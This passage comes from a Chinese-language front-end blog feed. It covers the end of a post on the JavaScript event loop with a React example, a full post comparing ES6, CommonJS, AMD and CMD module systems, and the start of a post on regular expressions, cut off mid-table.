class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parent</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span></span>&#123;</span><br><span class="line">  state: &#123;</span><br><span class="line">    form: &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  addFormData(obj) &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; form &#125; = <span class="keyword">this</span>.state;</span><br><span class="line">    form = <span class="built_in">Object</span>.assign(form, obj)</span><br><span class="line">    <span class="keyword">this</span>.setState(&#123; form &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;&gt;</span><br><span class="line">        &lt;Step1 addFormData=&#123;<span class="keyword">this</span>.addFormData.bind(<span class="keyword">this</span>)&#125; /&gt;</span><br><span class="line">        &lt;Step2 addFormData=&#123;<span class="keyword">this</span>.addFormData.bind(<span class="keyword">this</span>)&#125; /&gt;</span><br><span class="line">        &lt;Step3 addFormData=&#123;<span class="keyword">this</span>.addFormData.bind(<span class="keyword">this</span>)&#125; form=&#123;<span class="keyword">this</span>.state.form&#125; /&gt;</span><br><span class="line">        &lt;Result /&gt;</span><br><span class="line">      &lt;<span class="regexp">/&gt;</span></span><br><span class="line"><span class="regexp">    )</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">class Step3 extends React.Component&#123;</span></span><br><span class="line"><span class="regexp">  handleSubmit()&#123;</span></span><br><span class="line"><span class="regexp">    this.props.addFormData(&#123;'a':1&#125;);</span></span><br><span class="line"><span class="regexp">    /</span><span class="regexp">/ 获取this.props.form提交表单</span></span><br><span class="line"><span class="regexp">    /</span><span class="regexp">/ 这时,Parent中的form已经更新了，但是DOM还没更新完，值还没被传到&lt;Step3 /</span>&gt;中</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.props.form)  <span class="comment">// &#123;&#125;</span></span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="keyword">this</span>.props.form)  <span class="comment">// &#123;'a':1&#125;</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://juejin.im/post/5a6547d0f265da3e283a1df7" target="_blank" rel="noopener">从浏览器多进程到JS单线程，JS运行机制最全面的一次梳理</a></li><li><a href="https://juejin.im/post/59e85eebf265da430d571f89" target="_blank" rel="noopener">这一次，彻底弄懂 JavaScript 执行机制</a></li><li><a href="http://fex.baidu.com/blog/2014/05/what-happen/" target="_blank" rel="noopener">FEX 从输入 URL 到页面加载完成的过程中都发生了什么事情？</a></li><li><a href="https://juejin.im/entry/57ff3cea0e3dd90057e5f25e" target="_blank" rel="noopener">主流浏览器内核介绍（前端开发值得了解的浏览器内核历史）</a></li><li><a href="https://hllvm-group.iteye.com/group/topic/37596" target="_blank" rel="noopener">各JavaScript引擎的简介，及相关资料/博客收集帖</a></li><li><a href="https://juejin.im/entry/59e1d31f51882578c3411c77" target="_blank" rel="noopener">浏览器的渲染：过程与原理</a></li><li><a href="http://www.dailichun.com/2018/03/12/whenyouenteraurl.html" target="_blank" rel="noopener">从输入URL到页面加载的过程？如何由一道题完善自己的前端知识体系！</a></li><li><a href="https://juejin.im/entry/59e1d31f51882578c3411c77" target="_blank" rel="noopener">浏览器的渲染：过程与原理</a></li><li><a href="http://www.ruanyifeng.com/blog/2014/10/event-loop.html" target="_blank" rel="noopener">JavaScript 运行机制详解：再谈Event Loop</a></li><li><a href="https://juejin.im/post/5c41b37de51d45527201a87f" target="_blank" rel="noopener">我尤其想理清楚javaScript的执行机制</a></li></ul>]]></content>
      
      <categories>
          
          <category> Browser </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>模块化：CommonJS, AMD, CMD, ES6</title>
      <link href="/2019/06/11/%E6%A8%A1%E5%9D%97%E5%8C%96/"/>
      <url>/2019/06/11/%E6%A8%A1%E5%9D%97%E5%8C%96/</url>
      <content type="html"><![CDATA[<blockquote><p>模块化可以提高代码复用率，方便进行代码的管理。通常一个文件就是一个模块，有自己的作用域，只向外暴露特定的变量和函数。目前流行的js模块化规范有CommonJS, AMD, CMD, ES6的模块系统。</p></blockquote><p><br></p><h3 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h3><p>历史上，Javascript一直没有模块(module)体系，无法将一个大程序拆分为互相依赖的小文件，再用简单的方法拼接起来。在ES6之前，社区指定了一些模块加载方案，主要有CommonJS和ADM，前者用于服务器，后者用于浏览器。后来，ES6实现了模块功能，完全可以替代CommonJS和AMD规范，成为了浏览器和服务器通用的模块解决方案。</p><p><br></p><h3 id="1-ES6模块"><a href="#1-ES6模块" class="headerlink" title="1. ES6模块"></a>1. ES6模块</h3><p>浏览器加载ES6模块，也使用<code>&lt;script&gt;</code>标签，要加入<code>type=&quot;module&quot;</code>属性。浏览器会等到整个页面渲染完，再执行模块脚本，等同于打开<code>&lt;script&gt;</code>的<code>defer</code>属性。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"module"</span> <span class="attr">src</span>=<span class="string">"./foo.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><ul><li>对于外部的模块脚本，代码是在模块作用域中运行，而不是在全局作用域运行。模块内部的顶层变量，外部不可见。</li><li>模块之中，可以使用<code>import</code>加载其他模块，需要提供绝对 / 相对url，也可以使用<code>export</code>命令输出对外接口</li><li>模块之中，顶层的<code>this</code>关键字返回<code>undefined</code>，而不是指向<code>window</code>。因此，在模块顶层使用this关键字，是无意义的。</li><li><p>同一个模块如果加载多次，将只执行依次</p></li><li><p>定义模块</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> basicNum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> add = <span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123; basicNum, add &#125;</span><br></pre></td></tr></table></figure></li><li><p>引用模块</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; basicNum, add &#125; <span class="keyword">from</span> <span class="string">'./math'</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  ele.textContent = add(<span class="number">99</span> + basicNum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>export default</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义输出</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123; basicNum, add &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 引入</span></span><br><span class="line"><span class="keyword">import</span> math <span class="keyword">from</span> <span class="string">'./math'</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  ele.textContent = math.add(<span class="number">99</span> + math.basicNum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="2-CommonJS"><a href="#2-CommonJS" class="headerlink" title="2. CommonJS"></a>2. CommonJS</h3><p>Node.js是commonJS规范的主要实践者，它的四个重要的环境变量为模块化的实现提供支持: <em><code>module</code></em>、<em><code>exports</code></em>、<em><code>require</code></em>、<em><code>global</code></em>。用<code>module.exports</code>定义当前模块对外输出的接口（不推荐直接用exports），用<code>require</code>加载模块。</p><p>CommonJS用同步不的方式加载模块。在服务端，模块文件都存在本地磁盘，读取非常快，所以这样不会有问题。但在浏览器端，限于网络原因，更合理是使用异步加载。</p><ul><li><p>定义模块</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> basicNum = <span class="number">0</span>; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  add: add,</span><br><span class="line">  basicNum: basicNum</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>引用模块</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引用自定义模块，参数为文件路径，可省略.js</span></span><br><span class="line"><span class="keyword">var</span> math = <span class="built_in">require</span>(<span class="string">'./math'</span>);</span><br><span class="line">math.add(<span class="number">2</span>,<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 引用核心模块，不需要带路径</span></span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line">http.createService(...).listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="3-AMD和require-js"><a href="#3-AMD和require-js" class="headerlink" title="3. AMD和require.js"></a>3. AMD和require.js</h3><p>AMD规范采用异步方式加载模块，模块的加载不影响它后面语句的运行。所有依赖这个模块的语句，都定义在一个回调函数中，等到加载完成之后，这个回调函数才会运行。</p><ul><li><p>引用模块</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 网页中引入require.js和main.js</span></span><br><span class="line">&lt;script src=<span class="string">"js/require.js"</span> data-main=<span class="string">"js/main"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// main.js 入口文件/主模块</span></span><br><span class="line"><span class="comment">// 1. 用require.config()指定各模块路径和引用名</span></span><br><span class="line"><span class="built_in">require</span>.config(&#123;</span><br><span class="line">  baseUrl: <span class="string">'js/lib'</span>,</span><br><span class="line">  paths: &#123;</span><br><span class="line">    <span class="string">'jquery'</span>: <span class="string">'jquery.min'</span>,  <span class="comment">// 实际路径为js/lib/jquery.min.js</span></span><br><span class="line">    <span class="string">'underscore'</span>: <span class="string">'underscore.min'</span>,</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 依赖这个模块的一些操作</span></span><br><span class="line"><span class="built_in">require</span>([<span class="string">"jquery"</span>, <span class="string">"underscore"</span>], <span class="function"><span class="keyword">function</span>(<span class="params">$, _</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// some code here</span></span><br><span class="line">  <span class="built_in">console</span>.log($);</span><br><span class="line">  <span class="built_in">console</span>.log(_);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>定义模块</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义math.js模块</span></span><br><span class="line">define(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> basicNum = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> add = <span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    add: add,</span><br><span class="line">    basicNum: basicNum,</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个依赖underscore.js的模块</span></span><br><span class="line">define([<span class="string">'underscore'</span>],<span class="function"><span class="keyword">function</span>(<span class="params">_</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> classify = <span class="function"><span class="keyword">function</span>(<span class="params">list</span>)</span>&#123;</span><br><span class="line">    _.countBy(list,<span class="function"><span class="keyword">function</span>(<span class="params">num</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> num &gt; <span class="number">30</span> ? <span class="string">'old'</span> : <span class="string">'young'</span>;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    classify :classify</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 引用模块，将模块放在[]内</span></span><br><span class="line"><span class="built_in">require</span>([<span class="string">'jquery'</span>, <span class="string">'math'</span>], <span class="function"><span class="keyword">function</span>(<span class="params">$, math</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> sum = math.add(<span class="number">10</span>,<span class="number">20</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="4-CMD与sea-js"><a href="#4-CMD与sea-js" class="headerlink" title="4. CMD与sea.js"></a>4. CMD与sea.js</h3><p>require.js在申明依赖的模块时会第一时间加载并执行模块内的代码。CMD是另一种js模块化方案，与AMD很类似。AMD推送依赖前置，提前执行，CMD推崇依赖就近，延迟执行。此规范是在sea.js推广过程中产生的。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// AMD写法</span></span><br><span class="line">define([<span class="string">"a"</span>, <span class="string">"b"</span>, <span class="string">"c"</span>], <span class="function"><span class="keyword">function</span>(<span class="params">a, b, c</span>) </span>&#123;</span><br><span class="line">  a.doSomething();</span><br><span class="line">  <span class="keyword">if</span> (<span class="literal">false</span>)&#123;</span><br><span class="line">    <span class="comment">// 即使没有用到模块b，但b还是提前执行了</span></span><br><span class="line">    b.doSomething();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// CMD写法</span></span><br><span class="line">define(<span class="function"><span class="keyword">function</span>(<span class="params">require, exports, module</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 在需要时才申明</span></span><br><span class="line">  <span class="keyword">var</span> a = <span class="built_in">require</span>(<span class="string">'./a'</span>);</span><br><span class="line">  a.doSomething();</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>sea.js使用方法<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义模块</span></span><br><span class="line">define(<span class="function"><span class="keyword">function</span>(<span class="params">require, exports, module</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> $ = <span class="built_in">require</span>(<span class="string">'jquery.js'</span>);</span><br><span class="line">  <span class="keyword">var</span> add = <span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">  &#125;</span><br><span class="line">  exports.add = add;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载模块</span></span><br><span class="line">seajs.use([<span class="string">'math.js'</span>], <span class="function"><span class="keyword">function</span>(<span class="params">math</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> sum = math.add(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="5-区别"><a href="#5-区别" class="headerlink" title="5. 区别"></a>5. 区别</h3><h4 id="5-1-值拷贝-值引用"><a href="#5-1-值拷贝-值引用" class="headerlink" title="5.1 值拷贝 / 值引用"></a>5.1 值拷贝 / 值引用</h4><p>commonJS模块输出的是一个值的拷贝，ES6模块输出的是值的引用。</p><ul><li><p>commonJS模块输出的是值的拷贝，一旦输出一个值，模块内部的变化就影响不到这个值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// commonjs.js</span></span><br><span class="line"><span class="keyword">var</span> counter = <span class="number">3</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">incCounter</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  counter++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCounter</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> counter;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  counter: counter,</span><br><span class="line">  incCounter: incCounter,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// main.js</span></span><br><span class="line"><span class="keyword">var</span> mod = <span class="built_in">require</span>(<span class="string">'./lib'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(mod.counter);    <span class="comment">// 3</span></span><br><span class="line">mod.incCounter();</span><br><span class="line"><span class="built_in">console</span>.log(mod.counter);    <span class="comment">// 3</span></span><br><span class="line"><span class="built_in">console</span>.log(mod.getCounter); <span class="comment">// 4</span></span><br></pre></td></tr></table></figure></li><li><p>JS引擎在遇到ES6模块<code>import</code>命令时，会生成一个只读引用。等脚本真正执行的时候，根据引用，到被加载的模块里面去取值。ES6模块是动态引用，不会缓存值，模块里面的变量绑定其所在的模块。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// lib.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">let</span> counter = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">incCounter</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  counter ++</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// main.js</span></span><br><span class="line"><span class="comment">// ES6模块输出的变量counter是活的，完全反应其在模块lib.js内部的变化</span></span><br><span class="line"><span class="keyword">import</span> &#123; counter, incCounter &#125; <span class="keyword">from</span> <span class="string">'./lib'</span>;</span><br><span class="line"><span class="built_in">console</span>.log(counter);   <span class="comment">// 3</span></span><br><span class="line">incCounter();</span><br><span class="line"><span class="built_in">console</span>.log(counter);   <span class="comment">// 4</span></span><br></pre></td></tr></table></figure></li></ul><p>再举一个ES6 module的例子，过了500毫秒，foo的值会从bar -&gt; baz<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// m1.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">var</span> foo = <span class="string">"bar"</span>;</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> foo = <span class="string">'baz'</span>, <span class="number">500</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// m2.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; foo &#125; <span class="keyword">from</span> <span class="string">'./m1.js'</span>;</span><br><span class="line"><span class="built_in">console</span>.log(foo);</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(foo), <span class="number">500</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// bar</span></span><br><span class="line"><span class="comment">// baz</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-2-运行时加载-编译时加载"><a href="#5-2-运行时加载-编译时加载" class="headerlink" title="5.2 运行时加载 / 编译时加载"></a>5.2 运行时加载 / 编译时加载</h4><p>commonJS先整体加载fs模块，生成一个对象，然后再从这个对象上面读取3个方法。因为只有运行时才能得到这个对象，这种加载称为“运行时加载”。</p><p>ES6 module的写法，实质是从fs模块加载3个方法，其他方法不加载。使得编译时就能确定模块的依赖关系，以及输出和输入的关系。CommonJS和ADMO模块，都只能在运行时确定这些东西。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// CommonJS</span></span><br><span class="line"><span class="keyword">let</span> &#123; stat, exists, readFile &#125; = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ES6 module</span></span><br><span class="line"><span class="keyword">import</span> &#123; stat, exists, readFile &#125; <span class="keyword">from</span> <span class="string">'fs'</span>;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="6-避免变量冲突"><a href="#6-避免变量冲突" class="headerlink" title="6.避免变量冲突"></a>6.避免变量冲突</h3><p>模块化主要用来抽离公用代码，隔离作用域，避免变量冲突等。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// IIFE: 使用自执行函数来编写模块化，在一个单独的函数作用域中执行代码，避免变量冲突</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    data: []</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)()</span><br><span class="line"></span><br><span class="line"><span class="comment">// AMD: 使用require.js来编写模块化，特点：依赖必须提前声明好</span></span><br><span class="line">define(<span class="string">'./index.js'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">code</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// code就是 index.js 返回的内容</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// CMD: 使用seaJS来编写模块化，特点：支持动态引入依赖文件</span></span><br><span class="line">define(<span class="function"><span class="keyword">function</span>(<span class="params">require, exports, module</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> indexCode = <span class="built_in">require</span>(<span class="string">'./index.js'</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// CommonJS: nodejs中自带的模块化</span></span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ES Modules: ES引入的模块化，支持import来引入一个js</span></span><br><span class="line"><span class="keyword">import</span> &#123; a &#125; <span class="keyword">from</span> <span class="string">'./index.js'</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="http://es6.ruanyifeng.com/#docs/module" target="_blank" rel="noopener">Module的语法</a></li><li><a href="http://es6.ruanyifeng.com/#docs/module-loader" target="_blank" rel="noopener">Module 的加载实现</a></li><li><a href="https://juejin.im/post/5aaa37c8f265da23945f365c" target="_blank" rel="noopener">前端模块化：CommonJS,AMD,CMD,ES6</a></li></ul>]]></content>
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>正则表达式</title>
      <link href="/2019/06/10/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>/2019/06/10/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      <content type="html"><![CDATA[<blockquote><p>正则表达式是一个描述规则的表达式，它可以匹配模式，匹配字符，匹配位置，进而实现搜索和替换功能。</p></blockquote><p><br></p><h3 id="1-匹配规则"><a href="#1-匹配规则" class="headerlink" title="1. 匹配规则"></a>1. 匹配规则</h3><h4 id="1-1-单个字符"><a href="#1-1-单个字符" class="headerlink" title="1.1 单个字符"></a>1.1 单个字符</h4><p>单个字符的映射关系是一对一的，匹配到的字符只有一个。</p><table><thead><tr><th>匹配类型</th><th style="text-align:right">正则表达式</th></tr></thead><tbody><tr><td>简单字符</td><td style="text-align:right">a （匹配字符a）</td></tr><tr><td>特殊字符</td><td style="text-align:right"><code>\*</code> （匹配字符*，特殊字符用\转义）</td></tr><tr><td>换行符</td><td style="text-align:right">\n      </td></tr><tr><td>换页符</td><td style="text-align:right">\f       </td></tr><tr><td>回车符</td><td style="text-align:right">\r        </td></tr><tr><td>空白符</td><td style="text-align:right">\s        </td></tr><tr><td>制表符</td><td style="text-align:right">\t        </td></tr><tr><td>垂直制表符</td><td style="text-align:right">\v       </td></tr><tr><td>回退符</td><td style="text-align:right"><code>[\b]</code>      </td></tr></tbody></table><p><br></p><h4 id="1-2-区间"><a href="#1-2-区间" class="headerlink" title="1.2 区间"></a>1.2 区间</h4><p> <em><code>[]</code></em> 来表示集合，用 <em><code>-</code></em> 来表示去区间范围，就可以实现一对多的匹配。<br><em>/[123]/</em> 匹配1,2,3中的任意一个字符，<em>/[0-9]/</em> 匹配0到9的任意一个数字，<em>/[a-z]/</em> 匹配任意一个英文小写字母。</p><table><thead><tr><th>匹配区间</th><th style="text-align:center">正则表达式</th><th style="text-align:right">记忆方式</th></tr></thead><tbody><tr><td>集合区间</td><td style="text-align:center">[123]</td><td style="text-align:right">匹配一个字符，可以是1,2,3之一</td></tr><tr><td>通配符，表示几乎任意字符。换行符、回车符、行分隔符和段分隔符除外。</td><td style="text-align:center">.</td><td style="text-align:right"></td></tr><tr><td>单个数字，[0-9]</td><td style="text-align:center">\d</td><td style="text-align:right">digit</td></tr><tr><td>除了[0-9]</td><td style="text-align:center">\D</td><td style="text-align:right">not digit</td></tr><tr><td>包括下划线在内的单个字符[A-Za-z0-9]</td><td style="text-align:center">\w</td><td style="text-align:right">word</td></tr><tr><td>非单字字符</td><td style="text-align:center">\W</td><td style="text-align:right">not 